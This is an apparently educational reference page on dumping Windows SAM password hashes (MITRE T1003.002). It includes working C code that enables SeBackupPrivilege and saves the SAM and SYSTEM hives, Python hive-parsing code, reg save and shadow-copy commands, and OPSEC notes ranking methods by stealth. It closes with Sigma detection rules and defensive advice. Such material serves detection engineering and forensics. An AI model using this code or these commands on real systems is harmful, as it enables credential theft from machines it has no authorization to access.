# SAM Registry Dump - Educational Analysis

> **MITRE ATT&CK**: T1003.002 - OS Credential Dumping: Security Account Manager
> **Purpose**: Understanding SAM database architecture and hash extraction for detection engineering
> **Languages**: C, Python
> **Detection Focus**: Registry hive access, Volume Shadow Copy creation, SeBackupPrivilege usage

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

The Security Account Manager (SAM) database is where Windows stores local account password hashes. Every local user account -- including the built-in Administrator -- has its NTLM hash stored in the SAM registry hive. Understanding SAM internals is essential for:

- **Detection Engineering**: Monitoring for SAM/SYSTEM hive exfiltration attempts
- **Incident Response**: Determining whether local credential stores were compromised
- **Security Architecture**: Understanding why domain-joined accounts use different credential storage
- **Forensics**: Offline hash extraction from disk images during investigation

The SAM hive is locked by the operating system while Windows is running, which means direct file reads fail. Attackers use several techniques to obtain copies -- each with a different detection profile.

## Technical Deep-Dive

### SAM Database Architecture

```
+-----------------------------------------------------------------------+
|                  SAM Encryption Hierarchy                              |
+-----------------------------------------------------------------------+
|                                                                       |
|  SYSTEM Hive (provides encryption keys)                               |
|  Path: C:\Windows\System32\config\SYSTEM                              |
|  Contains:                                                            |
|    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\JD                      |
|    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Skew1                   |
|    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\GBG                     |
|    HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Data                    |
|                                                                       |
|  BOOTKEY (SYSKEY) Derivation:                                         |
|  ┌──────────────────────────────────────────────────────────────┐     |
|  │ 1. Read ClassNames from JD, Skew1, GBG, Data keys           │     |
|  │ 2. Concatenate class name hex strings                        │     |
|  │ 3. Apply permutation table (scramble byte order)             │     |
|  │ 4. Result: 16-byte BOOTKEY                                   │     |
|  └──────────────────────────────────────────────────────────────┘     |
|       |                                                               |
|       v                                                               |
|  SAM Hive (stores encrypted account data)                             |
|  Path: C:\Windows\System32\config\SAM                                 |
|  Contains:                                                            |
|    HKLM\SAM\SAM\Domains\Account\F        (domain key material)       |
|    HKLM\SAM\SAM\Domains\Account\Users\{RID}\V  (per-user data)      |
|                                                                       |
|  Decryption Chain:                                                    |
|  ┌──────────────────────────────────────────────────────────────┐     |
|  │ BOOTKEY                                                      │     |
|  │    + SAM domain key (from Account\F value)                   │     |
|  │    -> RC4/AES decrypt -> per-user encryption key              │     |
|  │         + User RID (relative identifier)                     │     |
|  │         -> DES/AES decrypt -> NT hash (16 bytes)             │     |
|  └──────────────────────────────────────────────────────────────┘     |
|                                                                       |
|  Hash Storage:                                                        |
|  - NT hash: MD4(UTF-16LE(password))  -- 16 bytes                    |
|  - LM hash: DES-based (disabled by default since Vista)              |
|  - Both are double-encrypted with the BOOTKEY-derived key            |
|                                                                       |
+-----------------------------------------------------------------------+
```

### SAM V-Value Structure (Per-User Record)

```
+------------------------------------------------------------------+
|  SAM V-Value Layout (HKLM\SAM\...\Users\{RID}\V)                |
+------------------------------------------------------------------+
| Offset | Description                                             |
|--------|--------------------------------------------------------|
| 0x00   | Array of offset/length/unknown triples (12 bytes each) |
|        | Entry  0: Unused                                        |
|        | Entry  1: Unused                                        |
|        | Entry  2: Unused                                        |
|        | Entry  3: Username (Unicode)                            |
|        | Entry  4: Full Name (Unicode)                           |
|        | Entry  5: Comment (Unicode)                             |
|        | ...                                                     |
|        | Entry 13: LM hash (encrypted, 20+ bytes)               |
|        | Entry 14: NT hash (encrypted, 20+ bytes)               |
|        | Entry 15: LM hash history                              |
|        | Entry 16: NT hash history                              |
| 0xCC+  | Variable data area (strings, hashes referenced above)  |
+------------------------------------------------------------------+
| The offset in each entry is relative to 0xCC (the start of the  |
| variable data area). Add 0xCC to get the absolute offset.       |
+------------------------------------------------------------------+
```

### C Implementation: Registry Hive Extraction

```c
/*
 * Educational: SAM and SYSTEM hive extraction via RegSaveKey.
 *
 * RegSaveKeyW saves a copy of a registry hive to a file.
 * This is one of several methods for obtaining the SAM and
 * SYSTEM hives, which together contain local account hashes.
 *
 * DETECTION (VERY HIGH VISIBILITY):
 * -----------------------------------------------------------------
 * 1. Sysmon Event 1: reg.exe process creation with "save" argument
 *    targeting SAM or SYSTEM is an immediate high-severity alert.
 * 2. Security Event 4656/4663: Object access to SAM registry key.
 * 3. The RegSaveKey API itself triggers kernel auditing.
 * 4. The saved file on disk is a forensic artifact.
 * 5. EDR products universally flag this operation.
 * -----------------------------------------------------------------
 *
 * OPSEC COMPARISON:
 * Method            | Detection Level | Disk Artifact | Notes
 * ------------------|----------------|---------------|-------------------
 * reg.exe save      | VERY HIGH      | Yes (file)    | Logged extensively
 * RegSaveKeyW API   | HIGH           | Yes (file)    | Same as reg.exe
 * Volume Shadow Copy| MEDIUM         | Temp VSS      | Less direct logging
 * In-memory parsing | LOW            | None          | No disk artifact
 * ntds.dit (DC only)| HIGH           | Yes (file)    | Different technique
 *
 * REQUIREMENTS:
 * - Administrator privileges (to access SAM/SYSTEM keys)
 * - SeBackupPrivilege (for some approaches)
 *
 * BUILD: cl.exe /nologo /W3 sam_dump.c /link advapi32.lib
 */
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

/*
 * Enable SeBackupPrivilege for registry access.
 *
 * DETECTION: Enabling SeBackupPrivilege triggers:
 * - Security Event 4672: Special privileges assigned
 * - Security Event 4703: Token right adjusted
 * - EDR: Privilege escalation alert
 *
 * OPSEC: SeBackupPrivilege enables reading any file/registry key
 * regardless of ACL. Its activation is a high-fidelity signal.
 */
BOOL enable_backup_privilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken)) {
        printf("[!] OpenProcessToken failed: %lu\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, L"SeBackupPrivilege", &luid)) {
        printf("[!] LookupPrivilegeValue failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    /* DETECTION: This call generates Event 4703 */
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges failed: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

/*
 * Save SAM and SYSTEM registry hives to files.
 *
 * DETECTION EVENTS GENERATED:
 * ----------------------------------------------------------
 * - Security 4656: Handle requested to SAM/SYSTEM key
 * - Security 4663: Object access (read) on SAM/SYSTEM key
 * - Sysmon 11: File created (the saved hive files)
 * - Sysmon 13: Registry value query on SAM/SYSTEM
 * - EDR: RegSaveKey API interception
 * ----------------------------------------------------------
 *
 * EQUIVALENT COMMAND-LINE (even more detectable):
 *   reg save HKLM\SAM sam.hiv
 *   reg save HKLM\SYSTEM system.hiv
 *
 * These command lines are trivially detected by any SIEM.
 */
BOOL save_registry_hives(const wchar_t *sam_path, const wchar_t *sys_path) {
    HKEY hSAM, hSYSTEM;
    LONG result;

    /* Open SAM hive -- requires Administrator */
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hSAM);
    if (result != ERROR_SUCCESS) {
        printf("[!] Cannot open SAM hive: %ld\n", result);
        printf("    Requires Administrator privileges.\n");
        return FALSE;
    }

    /* Open SYSTEM hive -- required for BOOTKEY derivation */
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSYSTEM);
    if (result != ERROR_SUCCESS) {
        printf("[!] Cannot open SYSTEM hive: %ld\n", result);
        RegCloseKey(hSAM);
        return FALSE;
    }

    /*
     * RegSaveKeyW: Save a copy of the registry hive to a file.
     *
     * OPSEC: The output file is a direct forensic artifact.
     * The file will persist on disk unless explicitly deleted.
     * Forensic tools can recover it even after deletion.
     */
    printf("[*] Saving SAM hive to: %ls\n", sam_path);
    result = RegSaveKeyW(hSAM, sam_path, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[!] RegSaveKey SAM failed: %ld\n", result);
        /* ERROR_ALREADY_EXISTS (183) if file already exists */
    }

    printf("[*] Saving SYSTEM hive to: %ls\n", sys_path);
    result = RegSaveKeyW(hSYSTEM, sys_path, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[!] RegSaveKey SYSTEM failed: %ld\n", result);
    }

    RegCloseKey(hSAM);
    RegCloseKey(hSYSTEM);

    printf("[*] Hives saved. Parse offline with secretsdump or pypykatz.\n");
    return TRUE;
}

int main(void) {
    printf("=== SAM/SYSTEM Hive Extraction (Educational) ===\n\n");

    /* Step 1: Enable backup privilege */
    if (!enable_backup_privilege()) {
        printf("[!] Could not enable SeBackupPrivilege. Run as admin.\n");
        return 1;
    }
    printf("[+] SeBackupPrivilege enabled.\n\n");

    /* Step 2: Save hives */
    save_registry_hives(L"C:\\Temp\\sam.hiv", L"C:\\Temp\\system.hiv");

    printf("\n[*] Next steps (offline parsing):\n");
    printf("    secretsdump.py -sam sam.hiv -system system.hiv LOCAL\n");
    printf("    pypykatz registry --sam sam.hiv system.hiv\n");

    return 0;
}
```

### Python Implementation: Offline SAM/SYSTEM Parsing

```python
"""
Educational: Offline SAM and SYSTEM hive parsing.

This demonstrates the logic used by tools like impacket's
secretsdump.py to extract NTLM hashes from saved registry hives.
Understanding this parsing logic is critical for:
- Building forensic tools for incident response
- Validating that credential extraction occurred during IR
- Understanding what secretsdump.py does under the hood

DETECTION NOTES:
-----------------------------------------------------------------
1. This script operates on SAVED hive files (offline).
   The detection opportunity is at hive EXTRACTION time,
   not at parsing time.
2. If an attacker runs this on their own machine with
   exfiltrated hives, there is no detection opportunity.
3. Focus detection on the extraction phase:
   - reg.exe save commands
   - RegSaveKey API calls
   - Volume Shadow Copy creation
   - SeBackupPrivilege activation
-----------------------------------------------------------------

REQUIRES: pip install impacket (for full implementation)
"""
import struct
import hashlib
import binascii
from typing import Optional, Dict, Tuple

# Impacket provides full SAM parsing capability
# This is the same library used by secretsdump.py
try:
    from impacket.examples.secretsdump import LocalOperations, SAMHashes
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False


# ─── BOOTKEY Derivation ───────────────────────────────────────
# The BOOTKEY (SYSKEY) is derived from four registry key class
# names under HKLM\SYSTEM\CurrentControlSet\Control\Lsa.
# These class names are set at install time and rarely change.

# Permutation table for BOOTKEY scrambling
BOOTKEY_PERM_TABLE = [
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
    0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7
]

# Registry keys whose ClassNames form the scrambled BOOTKEY
BOOTKEY_KEYS = ["JD", "Skew1", "GBG", "Data"]


def derive_bootkey_from_class_names(class_hex_strings: list) -> bytes:
    """
    Derive the 16-byte BOOTKEY from the four registry key class names.

    Each of JD, Skew1, GBG, Data has a Unicode hex string as its
    class name. Concatenate them, decode hex, then apply the
    permutation table.

    DETECTION: This operation happens offline on saved hives.
    No runtime detection opportunity here. Detect the hive save.
    """
    # Concatenate all four class name hex strings
    combined_hex = "".join(class_hex_strings)

    # Decode hex string to bytes
    scrambled = binascii.unhexlify(combined_hex)

    # Apply permutation to unscramble
    bootkey = bytes([scrambled[BOOTKEY_PERM_TABLE[i]] for i in range(16)])

    return bootkey


def decrypt_sam_domain_key(bootkey: bytes, f_value: bytes) -> bytes:
    """
    Decrypt the SAM domain key using the BOOTKEY.

    The SAM domain key is stored in the F-value of:
      HKLM\SAM\SAM\Domains\Account\F

    Windows 10 1607+ uses AES-CBC for this step.
    Older versions used RC4.

    Returns the decrypted domain key used for per-user hash decryption.
    """
    # F-value contains revision, key material, etc.
    # Offset depends on Windows version
    revision = f_value[0x68]

    if revision == 1:
        # Legacy: RC4-based encryption (pre-Windows 10 1607)
        # rc4_key = MD5(f_value[0x70:0x80] + QWERTY_CONSTANT + bootkey + DIGITS_CONSTANT)
        # domain_key = RC4(rc4_key, f_value[0x80:0xA0])
        print("[*] SAM uses legacy RC4 encryption (revision 1)")
        return b"\x00" * 16  # Placeholder for educational purposes

    elif revision == 2:
        # Modern: AES-128-CBC encryption (Windows 10 1607+)
        # aes_key derived from bootkey via SHA256
        # domain_key = AES-CBC-decrypt(aes_key, iv, f_value[0x88:0xA8])
        print("[*] SAM uses AES encryption (revision 2)")
        return b"\x00" * 16  # Placeholder for educational purposes


def parse_sam_v_value(v_value: bytes, rid: int) -> Dict:
    """
    Parse a user's V-value to extract encrypted hash data.

    The V-value contains a header with offset/length pairs,
    followed by variable-length data (username, hashes, etc.).

    STRUCTURE:
    - Entries 0-12: Various user metadata
    - Entry 13: LM hash (encrypted)
    - Entry 14: NT hash (encrypted)
    Each entry: [4-byte offset][4-byte length][4-byte unknown]
    Offsets are relative to 0xCC in the V-value.
    """
    DATA_OFFSET = 0xCC  # Start of variable data area

    def read_entry(index: int) -> Tuple[int, int]:
        """Read offset and length for entry at given index."""
        base = index * 12 + 4  # Each entry is 12 bytes, skip first 4 bytes
        offset = struct.unpack("<I", v_value[base:base+4])[0] + DATA_OFFSET
        length = struct.unpack("<I", v_value[base+4:base+8])[0]
        return offset, length

    # Entry 3: Username
    uname_off, uname_len = read_entry(3)
    username = v_value[uname_off:uname_off+uname_len].decode("utf-16-le", errors="replace")

    # Entry 13: LM hash (encrypted)
    lm_off, lm_len = read_entry(13)
    lm_data = v_value[lm_off:lm_off+lm_len] if lm_len > 4 else None

    # Entry 14: NT hash (encrypted)
    nt_off, nt_len = read_entry(14)
    nt_data = v_value[nt_off:nt_off+nt_len] if nt_len > 4 else None

    return {
        "username": username,
        "rid": rid,
        "lm_hash_enc": lm_data,
        "nt_hash_enc": nt_data,
        "lm_hash_len": lm_len,
        "nt_hash_len": nt_len,
    }


def demonstrate_secretsdump_flow():
    """
    Demonstrate the full offline SAM parsing flow.
    This is what 'secretsdump.py -sam sam.hiv -system system.hiv LOCAL' does.

    OPSEC CONTEXT:
    ---------------------------------------------------------------
    Method: reg.exe save
    - VERY HIGH detection: Sysmon Event 1, Security 4656/4663
    - Creates files on disk (sam.hiv, system.hiv)
    - Command line is logged in process creation events
    - Any SIEM rule for "reg save SAM" will fire

    Method: Volume Shadow Copy (vssadmin / wmic)
    - MEDIUM detection: Event 8222 (VSS creation)
    - Access locked files via \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\
    - Less commonly monitored than reg.exe
    - Still creates artifacts (shadow copy itself)

    Method: In-memory SAM parsing (no disk write)
    - LOW detection: No file artifacts
    - Reads registry values directly via API
    - Requires SYSTEM or SeBackupPrivilege
    - Most OPSEC-safe but most complex to implement
    ---------------------------------------------------------------
    """
    print("=== SAM Hash Extraction Flow (Educational) ===\n")

    print("Phase 1: BOOTKEY Derivation from SYSTEM hive")
    print("  Read class names from: JD, Skew1, GBG, Data")
    print("  Under: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\")
    print("  Concatenate hex strings and apply permutation\n")

    print("Phase 2: SAM Domain Key Decryption")
    print("  Read: HKLM\\SAM\\SAM\\Domains\\Account\\F")
    print("  Decrypt domain key using BOOTKEY (AES or RC4)\n")

    print("Phase 3: Per-User Hash Extraction")
    print("  For each RID under: ...\\Domains\\Account\\Users\\")
    print("  Read V-value, parse header for hash offsets")
    print("  Decrypt NT hash using domain key + user RID\n")

    print("Phase 4: Output")
    print("  Format: username:rid:lm_hash:nt_hash:::")
    print("  Example: Administrator:500:aad3b435...:31d6cfe0d16ae931...\n")

    # Using impacket's built-in implementation
    if HAS_IMPACKET:
        print("[*] impacket is available. In practice:")
        print("    from impacket.examples.secretsdump import SAMHashes")
        print("    sam = SAMHashes('sam.hiv', 'system.hiv')")
        print("    sam.dump()")
    else:
        print("[*] impacket not installed. Install with:")
        print("    pip install impacket")


def demonstrate_vss_approach():
    """
    Volume Shadow Copy approach for accessing locked hive files.

    DETECTION:
    - Event 8222: Volume Shadow Copy creation
    - Event 4688: vssadmin.exe or wmic.exe process creation
    - Sysmon Event 1: Process creation with shadow copy arguments
    - File access from shadow copy path is less commonly monitored

    COMMANDS:
    vssadmin create shadow /for=C:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
    vssadmin delete shadows /shadow={id} /quiet
    """
    print("=== Volume Shadow Copy Approach ===\n")
    print("1. Create shadow copy:")
    print("   vssadmin create shadow /for=C:")
    print("   DETECTION: Event 8222, process creation\n")
    print("2. Copy locked files from shadow:")
    print("   copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\")
    print("        Windows\\System32\\config\\SAM C:\\Temp\\sam.hiv")
    print("   DETECTION: File creation in temp directory\n")
    print("3. Delete shadow copy (cleanup):")
    print("   vssadmin delete shadows /shadow={id} /quiet")
    print("   DETECTION: Shadow deletion event\n")
    print("OPSEC: Slightly less monitored than reg save, but")
    print("       VSS creation is still an unusual event on most systems.\n")


# Entry point
if __name__ == "__main__":
    demonstrate_secretsdump_flow()
    print("\n" + "=" * 60 + "\n")
    demonstrate_vss_approach()
```

## Detection Indicators

### Critical Detection Signals

| Detection Point | Event Source | Event ID | Description |
|----------------|-------------|----------|-------------|
| reg.exe save SAM | Sysmon | 1 | Process creation with `reg save HKLM\SAM` |
| reg.exe save SYSTEM | Sysmon | 1 | Process creation with `reg save HKLM\SYSTEM` |
| SAM registry access | Security | 4656 | Handle request to `HKLM\SAM` |
| SAM registry read | Security | 4663 | Read access on SAM objects |
| VSS creation | System | 8222 | Volume Shadow Copy creation |
| SeBackupPrivilege use | Security | 4672 | Special privilege assigned to logon |
| RegSaveKey API call | EDR / ETW | Varies | API-level monitoring by EDR |
| Hive file on disk | Sysmon | 11 | File creation matching `*.hiv` or known hive names |

### Sigma Detection Rules

```yaml
# Detect reg.exe saving SAM or SYSTEM hives
title: Registry Hive Dump via reg.exe
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        Image|endswith: '\reg.exe'
        CommandLine|contains|all:
            - 'save'
    target_hives:
        CommandLine|contains:
            - 'HKLM\SAM'
            - 'HKLM\SYSTEM'
            - 'HKLM\SECURITY'
            - 'hklm\sam'
            - 'hklm\system'
    condition: selection and target_hives
level: critical

# Detect Volume Shadow Copy creation (potential hive access)
title: Volume Shadow Copy Created for Credential Access
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 8222
    condition: selection
level: medium

# Detect secretsdump.py style output files
title: SAM Hash Dump File Created
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11
        TargetFilename|endswith:
            - '\sam.hiv'
            - '\system.hiv'
            - '\sam.save'
            - '\system.save'
            - '\sam.bak'
            - '\system.bak'
    condition: selection
level: critical
```

### Defensive Recommendations

1. **Disable LM hashes**: Ensure `NoLMHash = 1` in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
2. **Monitor reg.exe**: Alert on any `reg save` targeting SAM, SYSTEM, or SECURITY hives
3. **Restrict SeBackupPrivilege**: Remove from accounts that do not require it
4. **Sysmon Event 1**: Monitor process creation for reg.exe, vssadmin.exe, wmic.exe with suspicious arguments
5. **File integrity monitoring**: Alert on hive-sized files appearing in temp directories
6. **Credential Guard**: Protects LSASS-held credentials (though SAM hashes are separate)
7. **LAPS**: Use Local Administrator Password Solution so each machine has a unique local admin password

## Cross-References

- [SAM/LSA Secrets Theory](../../07-credential-access/sam-lsa-secrets.md)
- [LSASS Dumping Theory](../../07-credential-access/lsass-dumping.md)
- [MiniDump Implementation](minidump-implementation.md)
- [Token Manipulation](token-manipulation.md)
- [Windows Internals Reference](../../appendices/windows-internals-reference.md)

## References

- Microsoft: SAM Database Architecture
- Microsoft: Volume Shadow Copy Service
- MITRE ATT&CK T1003.002
- impacket: secretsdump.py Source Code
- Benjamin Delpy: Mimikatz lsadump::sam
- Moyix: Creddump (offline SAM parser)
